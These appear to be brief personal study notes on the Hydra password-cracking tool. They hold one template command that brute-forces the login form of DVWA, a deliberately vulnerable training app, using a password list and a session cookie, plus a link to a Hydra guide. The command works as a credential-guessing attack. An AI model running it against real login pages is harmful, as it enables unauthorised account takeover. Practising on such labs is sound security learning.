### Hydra Notes

#### Basic hydra command 

this command must be edited to fit the paramaters of the login page. it's just a basic layout of the command. 

`hydra 192.168.1.150 -l admin -P ‘pass.txt’ http-get-form “/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low”`

#### [A Detailed Guide on Hydra](https://www.hackingarticles.in/a-detailed-guide-on-hydra/)